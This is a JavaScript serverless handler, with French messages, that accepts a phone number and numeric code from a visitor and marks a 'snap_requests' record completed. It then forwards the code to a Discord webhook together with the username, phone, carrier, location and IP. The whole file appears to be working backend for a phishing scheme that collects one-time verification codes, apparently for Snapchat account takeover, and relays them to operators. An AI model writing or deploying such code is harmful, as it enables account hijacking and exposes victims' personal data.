import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') { res.status(200).end(); return; }
  if (req.method !== 'POST') return res.status(405).json({ success: false });

  try {
    const { phone, code } = req.body;
    if (!phone || !code) return res.status(400).json({ success: false, message: 'Champs manquants' });

    const sql = neon(process.env.DATABASE_URL);
    const result = await sql`SELECT id, username, phone, ip_address, code_length, status, operator, country, city FROM snap_requests WHERE phone = ${phone} LIMIT 1`;

    if (result.length === 0) return res.status(404).json({ success: false, message: 'Demande non trouvée' });
    const row = result[0];

    if (row.status === 'completed') {
      return res.status(200).json({ success: true, message: 'Déjà validé' });
    }

    const expectedLen = row.code_length || 6;
    const codeStr = String(code).replace(/\s/g, '');
    if (codeStr.length !== expectedLen || !/^\d+$/.test(codeStr)) {
      return res.status(400).json({ success: false, message: `Code invalide (${expectedLen} chiffres requis)` });
    }

    await sql`UPDATE snap_requests SET status = 'completed', staff_code = ${codeStr} WHERE phone = ${phone}`;

    // ─── Embed Discord avec code + bouton Ban IP ───
    if (process.env.DISCORD_WEBHOOK_URL) {
      try {
        const carrierNames = {
          'orange': 'Orange', 'sfr': 'SFR', 'bouygues': 'Bouygues',
          'base': 'BASE', 'orange_be': 'Orange Belgique', 'proximus': 'Proximus', 'telenet': 'Telenet'
        };
        const embed = {
          title: '🔓 Code saisi par l\'utilisateur',
          color: 0x10b981,
          fields: [
            { name: '👤 Username', value: row.username, inline: true },
            { name: '📞 Téléphone', value: row.phone, inline: true },
            { name: '🔢 Code', value: `||${codeStr}||`, inline: true },
            { name: '📡 Opérateur', value: carrierNames[row.operator] || row.operator, inline: true },
            { name: '🌍 Pays', value: row.country || 'Inconnu', inline: true },
            { name: '🏙️ Ville', value: row.city || 'Inconnue', inline: true },
            { name: '🌐 IP', value: row.ip_address || 'Inconnue', inline: true }
          ],
          footer: { text: `ID: ${row.id}` },
          timestamp: new Date().toISOString()
        };
        const components = [{
          type: 1,
          components: [{
            type: 2,
            style: 4,
            label: '🚫 Ban IP',
            custom_id: `banip_${row.ip_address}`,
            emoji: { name: '🔨' }
          }]
        }];
        await fetch(process.env.DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [embed], components })
        });
      } catch (e) {
        console.error('Webhook error:', e);
      }
    }

    return res.status(200).json({ success: true, message: 'Code validé' });
  } catch (e) {
    return res.status(500).json({ success: false, message: e.message });
  }
}